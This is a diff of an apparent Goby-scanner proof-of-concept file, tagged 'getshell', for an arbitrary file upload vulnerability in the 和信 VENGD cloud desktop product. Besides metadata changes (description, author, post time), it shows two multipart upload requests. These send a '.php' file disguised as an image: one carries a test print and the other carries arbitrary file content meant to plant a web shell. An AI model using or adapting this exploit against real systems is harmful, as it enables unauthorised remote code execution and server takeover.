@@ -5,11 +5,11 @@
             "getshell"
       ],
       "GobyQuery": "title=\"和信下一代云桌面VENGD\"",
-      "Description": "VENGD",
+      "Description": "和信创天云桌面系统存在任意文件上传",
       "Product": "VENGD",
       "Homepage": "https://www.vesystem.com/products/3",
-      "Author": "",
-      "Impact": "VENGD Arbitrary File Upload",
+      "Author": "aetkrad",
+      "Impact": "",
       "Recommendation": "",
       "References": [
             "https://blog.csdn.net/weixin_44146996/article/details/115611026"
@@ -37,7 +37,7 @@
                               "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
                         },
                         "data_type": "text",
-                        "data": "------WebKitFormBoundaryfcKRltGv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\r\nContent-Type: image/avif\r\n\r\n<?php\r\nprint \"{{{str1}}}\";\r\n?>\r\n------WebKitFormBoundaryfcKRltGv--",
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n<?php\nprint \"{{{str1}}}\";\n?>\n------WebKitFormBoundaryfcKRltGv--",
                         "set_variable": [
                               "str1|rand|str|7",
                               "r1|rand|int|8"
@@ -106,7 +106,7 @@
                               "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
                         },
                         "data_type": "text",
-                        "data": "------WebKitFormBoundaryfcKRltGv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\r\nContent-Type: image/avif\r\n\r\n{{{FileContent}}}\r\n------WebKitFormBoundaryfcKRltGv--",
+                        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{r1}}}.php\"\nContent-Type: image/avif\n\n{{{FileContent}}}\n------WebKitFormBoundaryfcKRltGv--",
                         "set_variable": [
                               "r1|rand|int|8"
                         ]
@@ -156,6 +156,6 @@
                   ]
             }
       ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-12-09 13:55:04",
+      "GobyVersion": "1.9.310"
 }
